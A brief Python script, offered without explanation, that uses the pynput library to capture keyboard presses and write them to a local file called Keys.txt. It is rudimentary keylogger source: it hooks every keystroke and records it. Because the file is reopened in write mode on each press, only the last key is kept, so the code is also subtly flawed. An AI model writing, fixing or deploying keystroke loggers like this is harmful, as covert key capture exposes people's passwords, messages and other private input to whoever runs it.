from pynput.keyboard import *

def key_press(Key):
    file=open('Keys.txt',  'w')
    file.write("{}".format(Key))
    file.close()

with Listener(on_press=key_press) as listener:
    listener.join()